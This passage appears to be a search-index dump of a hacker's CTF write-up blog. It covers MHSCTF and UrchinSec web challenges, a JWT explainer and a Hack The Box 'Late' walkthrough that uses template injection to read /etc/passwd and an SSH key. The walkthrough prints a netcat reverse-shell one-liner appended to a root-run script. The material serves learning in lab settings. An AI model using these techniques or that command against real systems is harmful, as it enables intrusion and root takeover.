https://mhsctf-cuppajoe.0xmmalik.repl.co/TODO%20fill%20out%20the%20links. So i check the page source code which seals the fate... <head> <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"> <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin> <link href=\"https://fonts.googleapis.com/css2?family=Lato:wght@300&family=Exo+2&display=swap\" rel=\"stylesheet\"> <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\"> <link rel=\"stylesheet\" href=\"https://mhsctf-webexploitdata.0xmmalik.repl.co/style.css\"> </head> <body> <div class=\"w3-content\"> <h2>Cuppa Joe</h2> <div class=\"sidenav\"> Sitemap: <ul> <li><a href=\"TODO fill out the links\">index.php</a></li> <li><a href=\"TODO fill out the links\">flag.php</a></li> <li><a href=\"TODO fill out the links\">message.php</a></li> </ul> </div> Welcome to Cuppa Joe! We're a coffee shop that... loves coffee! Our website is still under construction so don't be going around and exploiting us ;)<br /><br />Leave us a message in the meantime!<br /><br /> <form action=\"message.php\" method=\"POST\"> <label for=\"message\">Your message:</label><br /> <textarea name=\"message\" id=\"message\" rows=\"5\" cols=\"50\" style=\"height:30%;\"></textarea><br /> <input type=\"submit\"> </form> </div> </body> The href=\"TODO fill out the links\" jumps at me that I'm supposed to fill out the links with their proper reference. Because I'm only interested with the flag I use the browser inspector to change href=\"TODO fill out the links\" to href=\"flag.php\". Clicking the new link I get the flag .","title":"Challenge 4: Cuppa Joe - 3pts."},{"location":"Writeups/2022-02-26-mhsctf-2022/#challenge-5-practice-for-school-55pts","text":"This one was tricky. We're provided with a link to an edpuzzle classroom https://edpuzzle.com/assignments/60c90ddeffb96f416707e09d/watch. In the challenge description the author gives a note the video is 168 hours (1 week) long so you will not be able to watch through the whole thing. :) Well we could do that by forwarding the video. Now this is where I started scratching my head (but not for long). The youtube video had no controls and no way to forward it!!! Also the edpuzzle control bar was locked. There is a multiple-choice task that is activated when the video reached a time. I had to find a way to forward the video. The youtube video was an iframe suggesting that it had its own controls. It then occurred to me that the controls were somehow removed when the iframe was being loaded. I had to find a way to intercept the request. Burpsuite. I loaded burpsuite to intercept the iframe request and sure enough I intercepted the rogue request :) So i change controls=0 to controls=1 and now we have a control bar. Then IMPORTANT drag the control all the way to the end to reveal the multiple-choice question and finally the flag. All in all the CTF was awesome and a little challenging. Thanks to the MHSCTF team for the CTF. Looking forward for more CTFs from them. That's all i've got for this CTF. Till next CTF, Parsz.","title":"Challenge 5:  Practice For School - 55pts."},{"location":"Writeups/2022-03-06-urchinsec-ctf/","text":"URCHINSEC CTF 2022 Overall it was an easy ctf, very easy. I do not know anything about rev but I was able to solve some. This should tell you something. This was a jeopardy type CTF that was hosted by UrchinSec. It was not a team event and I went solo with some of my teammates. Aim was for the team @fr44aksmini to lead the scoreboard :). I bagged the 6th positon with 2840 points. As usual I took web security but due to competition \ud83d\ude38 I had to do other challs but the focus of this writeup is only on WebSec . In total there were eight challs and I was able to solve all except the eighth one. Challs Around 100-points Panel 100-points En-Code 100-points HeadStart 150-points Route 150-points Login 150-points Route II 150-points Refer 150-points(Unable to solve) Chall 1: Around 100-points The site says.... This was a really straight-forward hint. When I'm told to look around the first thing I look is the robots.txt file. We've got a part of the flag. Next checking the source code, there is nothing interesting apart from two files : main.css and js/main.js. Checking them out gives me the last parts of the flag. main.css js/main.js And that is how you get a 100 points flag. :rofl: Chall 2: Panel 100-points A login... As usual the first thing to check is the robots.txt and I'm not disappointed \ud83d\ude00 We are not supposed to see secret.php but what the heck. Forbidden fruits are sweeter. \ud83d\ude08 secret.php says From the script we get that the username is admin and the pass is a base64 encoded string $pass_string = \"V1ZkU2RHRlhOV2hrUjFaclRWUkplazVCYnowSwo=\"; which has been encoded three times. So we decode for them... Logging in we get the flag Chall 3: En-Code 100-points. Site says... source code: The part in green looks like a flag. Using dcode's cipher identifier we get know the flag is encoded in ASCII85. Decoding it we get the flag: Chall 4: HeadStart 150-points Visiting the site we get an API endpoint error.. This automatically shifts my brain for directory bruteforcing. Here comes Mr.Dirsearch. We can see two valid directories: /console and /source . The subdirectory /console is a rabbit hole and source is where I hit gold: @app.route('/getflag', methods=[\"PEWPEW\"]) def getflag(): if request.method != 'PEWPEW': data = {'error':'something went wrong'} return jsonify(data) else: data = {'success':f'{flag}'} return jsonify(data) There is an API endpoint /getflag and it uses http method \"PEWPEW\" (seriously who thought of the name!!!!). So I head out and using the network tab in developer tools change the method to PEWPEW to get the flag: Chall 5: Route 150-points Clicking around to get a feel of how the site behaves, the download button prompts you to download a file.. This could lead to something sweeter. Checking out the source code where the download button is we get.. <nav> <ul class=\"nav-links\"> <li><a href=\"#\">About</a></li> <li><a href=\"#\">Service</a></li> <li><a href=\"download.php?file=document.txt\">Download</a> <li><a href=\"#\">Capture The Flag</a></li> </ul On clicking the docunent part while in source code changes the url to.. ...and we can be able to view the contents. What if we changed the url to flag.txt... \ud83d\ude08 Chall 6: Login 150-points Website says.. The source code reveals a js file that is obfuscated. Seriously people, the obfuscation automatically tells me that there is something juicy here var _0x18b3=[\"\\x6C\\x6F\\x61\\x64\",\"\\x61\\x64\\x64\\x45\\x76\\x65\\x6E\\x74\\x4C\\x69\\x73\\x74\\x65\\x6E\\x65\\x72\", \"\\x73\\x75\\x62\\x6D\\x69\\x74\",\"\\x70\\x72\\x65\\x76\\x65\\x6E\\x74\\x44\\x65\\x66\\x61\\x75\\x6C\\x74\",\"\\x69\\x6E\\x70\\ x75\\x74\\x5B\\x6E\\x61\\x6D\\x65\\x3D\\x75\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\\x5D\",\"\\x69\\x6E\\x70\\x75\\x74\\x5B\\x6E\\x61\\ x6D\\x65\\x3D\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x5D\",\"\",\"\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\",\"\\x76\\x61\\x6C \\x75\\x65\",\"\\x71\\x75\\x65\\x72\\x79\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\",\"\\x59\\x57\\x52\\x74\\x61\\x57\\x34\",\"\\x75\",\" \\x49\\x6E\\x63\\x6F\\x72\\x72\\x65\\x63\\x74\\x20\\x55\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\",\"\\x64\\x58\\x4A\\x6A\\x61\\x47\\x6C\\ x75\\x65\\x33\\x42\\x6C\\x64\\x31\\x39\\x77\\x5A\\x58\\x64\\x66\\x63\\x47\\x56\\x33\\x58\\x33\\x42\\x6C\\x64\\x31\\x39\\x77\\x5A\\x5 8\\x64\\x66\\x63\\x47\\x56\\x33\\x66\\x51\\x6F\",\"\\x70\",\"\\x49\\x6E\\x63\\x6F\\x72\\x72\\x65\\x63\\x74\\x20\\x50\\x61\\x73\\x73\\x7 7\\x6F\\x72\\x64\",\"\\x43\\x6F\\x72\\x72\\x65\\x63\\x74\\x20\\x50\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x21\\x20\\x59\\x6F\\x75\\x72\\x 20\\x66\\x6C\\x61\\x67\\x20\\x69\\x73\\x20\",\"\\x2E\",\"\\x66\\x6F\\x72\\x6D\"];(async ()=>{ await new Promise(((_0x1f3ax1)=> {return window[_0x18b3[1]](_0x18b3[0],_0x1f3ax1)})),document[_0x18b3[9]](_0x18b3[18])[_0x18b3[1]](_0x18b3[2],( (_0x1f3ax1)=>{_0x1f3ax1[_0x18b3[3]]();const _0x1f3ax2={u:_0x18b3[4],p:_0x18b3[5]},_0x1f3ax3={};for(const _0x1f 3ax1 in _0x1f3ax2){_0x1f3ax3[_0x1f3ax1]= btoa(document[_0x18b3[9]](_0x1f3ax2[_0x1f3ax1])[_0x18b3[8]])[_0x18b3[ 7]](/=/g,_0x18b3[6])};return _0x18b3[10]!== _0x1f3ax3[_0x18b3[11]]?alert(_0x18b3[12]):_0x18b3[13]!== _0x1f3ax3 [_0x18b3[14]]?alert(_0x18b3[15]):void(alert(`${_0x18b3[16]}${atob(_0x1f3ax3[_0x18b3[14]])}${_0x18b3[17]}`))}))})() Heading to deobfuscate.io I'm able to know what the js is doing. (async () => { await new Promise(vandan => { return window.addEventListener(\"load\", vandan); }), document.querySelector(\"form\").addEventListener(\"submit\", yanelie => { yanelie.preventDefault(); const reshaud = {u: \"input[name=username]\", p: \"input[name=password]\"}, predrag = {}; for (const alene in reshaud) { predrag[alene] = btoa(document.querySelector(reshaud[alene]).value).replace(/=/g, \"\"); } ; return \"YWRtaW4\" !== predrag.u ? alert(\"Incorrect Username\") : \"dXJjaGlue3Bld19wZXdfcGV3X3Bld19wZXdfcGV3fQo\" !== predrag.p ? alert(\"Incorrect Password\") : void alert(`${\"Correct Password! Your flag is \"}${atob(predrag.p)}${\".\"}`); }); })(); The username and pass are base64 encoded and the pass is the flag. As usual I help these guys break their site.. \ud83d\ude08 Chall 7: Route II 150-points The challenge description says this This made my head to lock on LFI and RFI. This is how the page looks like.. With some form of LFI... Trying LFI and RFI proved useless and then I realized that the description was some sort of subliminal persuation. I was thinking the way the author wanted me to think, not how i should think think...bingo \ud83d\ude38. Mr.Dirsearch sorted me out....again.. So i go for my flag There it is folks..the flags for all challs except the eighth one. Nobody was able to solve it and I would like to ask the organizers to post the write-up for it. It's been a pleasure folks. Till next CTF, Par5z.","title":"Urchinsec 2022"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#urchinsec-ctf-2022","text":"Overall it was an easy ctf, very easy. I do not know anything about rev but I was able to solve some. This should tell you something. This was a jeopardy type CTF that was hosted by UrchinSec. It was not a team event and I went solo with some of my teammates. Aim was for the team @fr44aksmini to lead the scoreboard :). I bagged the 6th positon with 2840 points. As usual I took web security but due to competition \ud83d\ude38 I had to do other challs but the focus of this writeup is only on WebSec . In total there were eight challs and I was able to solve all except the eighth one.","title":"URCHINSEC CTF 2022"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#challs","text":"Around 100-points Panel 100-points En-Code 100-points HeadStart 150-points Route 150-points Login 150-points Route II 150-points Refer 150-points(Unable to solve)","title":"Challs"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#chall-1-around-100-points","text":"The site says.... This was a really straight-forward hint. When I'm told to look around the first thing I look is the robots.txt file. We've got a part of the flag. Next checking the source code, there is nothing interesting apart from two files : main.css and js/main.js. Checking them out gives me the last parts of the flag. main.css js/main.js And that is how you get a 100 points flag. :rofl:","title":"Chall 1: Around 100-points"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#chall-2-panel-100-points","text":"A login... As usual the first thing to check is the robots.txt and I'm not disappointed \ud83d\ude00 We are not supposed to see secret.php but what the heck. Forbidden fruits are sweeter. \ud83d\ude08 secret.php says From the script we get that the username is admin and the pass is a base64 encoded string $pass_string = \"V1ZkU2RHRlhOV2hrUjFaclRWUkplazVCYnowSwo=\"; which has been encoded three times. So we decode for them... Logging in we get the flag","title":"Chall 2: Panel 100-points"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#chall-3-en-code-100-points","text":"Site says... source code: The part in green looks like a flag. Using dcode's cipher identifier we get know the flag is encoded in ASCII85. Decoding it we get the flag:","title":"Chall 3: En-Code 100-points."},{"location":"Writeups/2022-03-06-urchinsec-ctf/#chall-4-headstart-150-points","text":"Visiting the site we get an API endpoint error.. This automatically shifts my brain for directory bruteforcing. Here comes Mr.Dirsearch. We can see two valid directories: /console and /source . The subdirectory /console is a rabbit hole and source is where I hit gold: @app.route('/getflag', methods=[\"PEWPEW\"]) def getflag(): if request.method != 'PEWPEW': data = {'error':'something went wrong'} return jsonify(data) else: data = {'success':f'{flag}'} return jsonify(data) There is an API endpoint /getflag and it uses http method \"PEWPEW\" (seriously who thought of the name!!!!). So I head out and using the network tab in developer tools change the method to PEWPEW to get the flag:","title":"Chall 4: HeadStart 150-points"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#chall-5-route-150-points","text":"Clicking around to get a feel of how the site behaves, the download button prompts you to download a file.. This could lead to something sweeter. Checking out the source code where the download button is we get.. <nav> <ul class=\"nav-links\"> <li><a href=\"#\">About</a></li> <li><a href=\"#\">Service</a></li> <li><a href=\"download.php?file=document.txt\">Download</a> <li><a href=\"#\">Capture The Flag</a></li> </ul On clicking the docunent part while in source code changes the url to.. ...and we can be able to view the contents. What if we changed the url to flag.txt... \ud83d\ude08","title":"Chall 5: Route 150-points"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#chall-6-login-150-points","text":"Website says.. The source code reveals a js file that is obfuscated. Seriously people, the obfuscation automatically tells me that there is something juicy here var _0x18b3=[\"\\x6C\\x6F\\x61\\x64\",\"\\x61\\x64\\x64\\x45\\x76\\x65\\x6E\\x74\\x4C\\x69\\x73\\x74\\x65\\x6E\\x65\\x72\", \"\\x73\\x75\\x62\\x6D\\x69\\x74\",\"\\x70\\x72\\x65\\x76\\x65\\x6E\\x74\\x44\\x65\\x66\\x61\\x75\\x6C\\x74\",\"\\x69\\x6E\\x70\\ x75\\x74\\x5B\\x6E\\x61\\x6D\\x65\\x3D\\x75\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\\x5D\",\"\\x69\\x6E\\x70\\x75\\x74\\x5B\\x6E\\x61\\ x6D\\x65\\x3D\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x5D\",\"\",\"\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\",\"\\x76\\x61\\x6C \\x75\\x65\",\"\\x71\\x75\\x65\\x72\\x79\\x53\\x65\\x6C\\x65\\x63\\x74\\x6F\\x72\",\"\\x59\\x57\\x52\\x74\\x61\\x57\\x34\",\"\\x75\",\" \\x49\\x6E\\x63\\x6F\\x72\\x72\\x65\\x63\\x74\\x20\\x55\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\",\"\\x64\\x58\\x4A\\x6A\\x61\\x47\\x6C\\ x75\\x65\\x33\\x42\\x6C\\x64\\x31\\x39\\x77\\x5A\\x58\\x64\\x66\\x63\\x47\\x56\\x33\\x58\\x33\\x42\\x6C\\x64\\x31\\x39\\x77\\x5A\\x5 8\\x64\\x66\\x63\\x47\\x56\\x33\\x66\\x51\\x6F\",\"\\x70\",\"\\x49\\x6E\\x63\\x6F\\x72\\x72\\x65\\x63\\x74\\x20\\x50\\x61\\x73\\x73\\x7 7\\x6F\\x72\\x64\",\"\\x43\\x6F\\x72\\x72\\x65\\x63\\x74\\x20\\x50\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\\x21\\x20\\x59\\x6F\\x75\\x72\\x 20\\x66\\x6C\\x61\\x67\\x20\\x69\\x73\\x20\",\"\\x2E\",\"\\x66\\x6F\\x72\\x6D\"];(async ()=>{ await new Promise(((_0x1f3ax1)=> {return window[_0x18b3[1]](_0x18b3[0],_0x1f3ax1)})),document[_0x18b3[9]](_0x18b3[18])[_0x18b3[1]](_0x18b3[2],( (_0x1f3ax1)=>{_0x1f3ax1[_0x18b3[3]]();const _0x1f3ax2={u:_0x18b3[4],p:_0x18b3[5]},_0x1f3ax3={};for(const _0x1f 3ax1 in _0x1f3ax2){_0x1f3ax3[_0x1f3ax1]= btoa(document[_0x18b3[9]](_0x1f3ax2[_0x1f3ax1])[_0x18b3[8]])[_0x18b3[ 7]](/=/g,_0x18b3[6])};return _0x18b3[10]!== _0x1f3ax3[_0x18b3[11]]?alert(_0x18b3[12]):_0x18b3[13]!== _0x1f3ax3 [_0x18b3[14]]?alert(_0x18b3[15]):void(alert(`${_0x18b3[16]}${atob(_0x1f3ax3[_0x18b3[14]])}${_0x18b3[17]}`))}))})() Heading to deobfuscate.io I'm able to know what the js is doing. (async () => { await new Promise(vandan => { return window.addEventListener(\"load\", vandan); }), document.querySelector(\"form\").addEventListener(\"submit\", yanelie => { yanelie.preventDefault(); const reshaud = {u: \"input[name=username]\", p: \"input[name=password]\"}, predrag = {}; for (const alene in reshaud) { predrag[alene] = btoa(document.querySelector(reshaud[alene]).value).replace(/=/g, \"\"); } ; return \"YWRtaW4\" !== predrag.u ? alert(\"Incorrect Username\") : \"dXJjaGlue3Bld19wZXdfcGV3X3Bld19wZXdfcGV3fQo\" !== predrag.p ? alert(\"Incorrect Password\") : void alert(`${\"Correct Password! Your flag is \"}${atob(predrag.p)}${\".\"}`); }); })(); The username and pass are base64 encoded and the pass is the flag. As usual I help these guys break their site.. \ud83d\ude08","title":"Chall 6: Login 150-points"},{"location":"Writeups/2022-03-06-urchinsec-ctf/#chall-7-route-ii-150-points","text":"The challenge description says this This made my head to lock on LFI and RFI. This is how the page looks like.. With some form of LFI... Trying LFI and RFI proved useless and then I realized that the description was some sort of subliminal persuation. I was thinking the way the author wanted me to think, not how i should think think...bingo \ud83d\ude38. Mr.Dirsearch sorted me out....again.. So i go for my flag There it is folks..the flags for all challs except the eighth one. Nobody was able to solve it and I would like to ask the organizers to post the write-up for it. It's been a pleasure folks. Till next CTF, Par5z.","title":"Chall 7: Route II 150-points"},{"location":"Writeups/2022-05-20-JWT/","text":"JSON JSON stands for JavaScript Object Notation that is used to represent data in a structured way based on JavaScript object Suntax. Example of JSON: { \"squadName\": \"Super hero squad\", \"homeTown\": \"Metro City\", \"formed\": 2016, \"secretBase\": \"Super tower\", \"active\": true, \"members\": [ { \"name\": \"Molecule Man\", \"age\": 29, \"secretIdentity\": \"Dan Jukes\", \"powers\": [ \"Radiation resistance\", \"Turning tiny\", \"Radiation blast\" ] } ] } JSON Web Token(s) JWT are used to represent claims between two parties. Claims can be related to any business process, but are typically used to represent an identity and it's associations: for example that the user logged in is part of a group or an admin. Basically a JWT contains three things and has this structure: aaaaa.bbbbb.ccccc where aaaaa, bbbbb and ccccc are different JSON objects that are encoded in base64URL fomart and separated by a dot (.). Breaking Down a JWT Header The first part of a JWT represented in the example above by aaaaa is the header. The header tells us what type of a token it is and the algorithm being used. Example: { \"alg\": \"HS256\", \"typ\": \"JWT\" } The header is then base64URL encoded to form the first part of the JWT. In our case the exaple above gives the following ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9 Payload This is the second part represented by bbbbb in the example. This is where the claims are. Claims are statements about an entity ( typically, the user) and additional data. A claim could be that the user is an admin. Example: { \"sub\": \"1234567890\", \"name\": \"John Doe\", \"admin\": true } The base64URL encoded payload looks like this ewogICJzdWIiOiAiMTIzNDU2Nzg5MCIsCiAgIm5hbWUiOiAiSm9obiBEb2UiLAogICJhZG1pbiI6IHRydWUKfQ Signature This is the last part of a JWT denoted by ccccc in the example. It's used to verify that the header and the payload have not been tampered with. This part of a JWT is optional and if not implemented produces an unsigned JWT. It takes a secret, the encoded header, the encoded payload and the algorithm specified in the header to sign that. To use HMACSHA256 you use: Example: HMACSHA256( base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)","title":"JSON WEB TOKENS (JWT)"},{"location":"Writeups/2022-05-20-JWT/#json","text":"JSON stands for JavaScript Object Notation that is used to represent data in a structured way based on JavaScript object Suntax. Example of JSON: { \"squadName\": \"Super hero squad\", \"homeTown\": \"Metro City\", \"formed\": 2016, \"secretBase\": \"Super tower\", \"active\": true, \"members\": [ { \"name\": \"Molecule Man\", \"age\": 29, \"secretIdentity\": \"Dan Jukes\", \"powers\": [ \"Radiation resistance\", \"Turning tiny\", \"Radiation blast\" ] } ] }","title":"JSON"},{"location":"Writeups/2022-05-20-JWT/#json-web-tokens","text":"JWT are used to represent claims between two parties. Claims can be related to any business process, but are typically used to represent an identity and it's associations: for example that the user logged in is part of a group or an admin. Basically a JWT contains three things and has this structure: aaaaa.bbbbb.ccccc where aaaaa, bbbbb and ccccc are different JSON objects that are encoded in base64URL fomart and separated by a dot (.).","title":"JSON Web Token(s)"},{"location":"Writeups/2022-05-20-JWT/#breaking-down-a-jwt","text":"","title":"Breaking Down a JWT"},{"location":"Writeups/2022-05-20-JWT/#header","text":"The first part of a JWT represented in the example above by aaaaa is the header. The header tells us what type of a token it is and the algorithm being used. Example: { \"alg\": \"HS256\", \"typ\": \"JWT\" } The header is then base64URL encoded to form the first part of the JWT. In our case the exaple above gives the following ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9","title":"Header"},{"location":"Writeups/2022-05-20-JWT/#payload","text":"This is the second part represented by bbbbb in the example. This is where the claims are. Claims are statements about an entity ( typically, the user) and additional data. A claim could be that the user is an admin. Example: { \"sub\": \"1234567890\", \"name\": \"John Doe\", \"admin\": true } The base64URL encoded payload looks like this ewogICJzdWIiOiAiMTIzNDU2Nzg5MCIsCiAgIm5hbWUiOiAiSm9obiBEb2UiLAogICJhZG1pbiI6IHRydWUKfQ","title":"Payload"},{"location":"Writeups/2022-05-20-JWT/#signature","text":"This is the last part of a JWT denoted by ccccc in the example. It's used to verify that the header and the payload have not been tampered with. This part of a JWT is optional and if not implemented produces an unsigned JWT. It takes a secret, the encoded header, the encoded payload and the algorithm specified in the header to sign that. To use HMACSHA256 you use: Example: HMACSHA256( base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)","title":"Signature"},{"location":"Writeups/2022-06-08-Late-Writeup/","text":"Late Htb Writeup 1.Enumeration nmap \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/Htb/late] \u2514\u2500$ nmap --min-rate 10000 -p- 10.129.227.134 -oN nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 03:58 EDT Warning: 10.129.227.134 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.227.134 Host is up (0.19s latency). Not shown: 58789 closed tcp ports (conn-refused), 6744 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 41.48 seconds The nmap scan did not give much results and port 80 will be our foothold. port 80 Looking around in the web server I find a link to an online photo editor. Heading there I'm taken to images.late.htb . Time to add it to /etc/hosts 10.129.227.134 late.htb 10.129.227.134 images.late.htb Images.late.htb I uploaded this picture and got back results,txt which had... This smelled of SSTI.... SSTI (From Hacktricks) A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. Detect The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as the polyglot ${{<%[%'\"}}%. Detect - Plaintext context The given input is being rendered and reflected into the response. This is easily mistaken for a simple XSS vulnerability, but it's easy to differentiate if you try to set mathematical operations within a template expression: So i'm going to use this image with mathematical operations to see if the site is vulnerable to SSTI... Which gives back ... The site is vulnerable to SSTI.. 2 Foothold Exploitation Since it's a flask application I'll try to read the contents of the /etc/passwd using this payload Which gives me <p>o 7 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin saned:x:115:119::/var/lib/saned:/usr/sbin/nologin colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin </p> Looking in the /etc/passwd file I can see there is a user called sc_acc . Remember port 22 was open from the nmap scan. I'll try to read svc_acc's ssh private key... The payload... And voila...the private key.. I give the key necessary permissions chmod +600 rsa and use it to login to ssh and read the user flag. 3 Privesc Enter linpeas I'm going to start a python server on my local machine to transfer linpeas to the compromised machine and try to look for ways to escalate priviledges.. Then use curl to get the file Looking at the output of linpeas and using this guide.. I find this interesting file.. Rading the contents of the file, the script runs every time a user logins or exits in. I'll append a reverse shell to the script to see if I'll get something echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.47 1234 >/tmp/f\" >> ssh-alert.sh Along the way I got some minor issues and reset the machine to get it as good as new. I start a netcat listener on my local machine and when I exit from my ssh session, I get a reverse shell..as ROOT !!","title":"Late HTB Writeup"},{"location":"Writeups/2022-06-08-Late-Writeup/#late-htb-writeup","text":"","title":"Late Htb Writeup"},{"location":"Writeups/2022-06-08-Late-Writeup/#1enumeration","text":"nmap \u250c\u2500\u2500(wolf\u327fpiratesec)-[~/Htb/late] \u2514\u2500$ nmap --min-rate 10000 -p- 10.129.227.134 -oN nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 03:58 EDT Warning: 10.129.227.134 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.227.134 Host is up (0.19s latency). Not shown: 58789 closed tcp ports (conn-refused), 6744 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 41.48 seconds The nmap scan did not give much results and port 80 will be our foothold.","title":"1.Enumeration"},{"location":"Writeups/2022-06-08-Late-Writeup/#port-80","text":"Looking around in the web server I find a link to an online photo editor. Heading there I'm taken to images.late.htb . Time to add it to /etc/hosts 10.129.227.134 late.htb 10.129.227.134 images.late.htb","title":"port 80"},{"location":"Writeups/2022-06-08-Late-Writeup/#imageslatehtb","text":"I uploaded this picture and got back results,txt which had... This smelled of SSTI....","title":"Images.late.htb"},{"location":"Writeups/2022-06-08-Late-Writeup/#ssti-from-hacktricks","text":"A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.","title":"SSTI (From Hacktricks)"},{"location":"Writeups/2022-06-08-Late-Writeup/#detect","text":"The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as the polyglot ${{<%[%'\"}}%. Detect - Plaintext context The given input is being rendered and reflected into the response. This is easily mistaken for a simple XSS vulnerability, but it's easy to differentiate if you try to set mathematical operations within a template expression: So i'm going to use this image with mathematical operations to see if the site is vulnerable to SSTI... Which gives back ... The site is vulnerable to SSTI..","title":"Detect"},{"location":"Writeups/2022-06-08-Late-Writeup/#2-foothold","text":"","title":"2 Foothold"},{"location":"Writeups/2022-06-08-Late-Writeup/#exploitation","text":"Since it's a flask application I'll try to read the contents of the /etc/passwd using this payload Which gives me <p>o 7 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 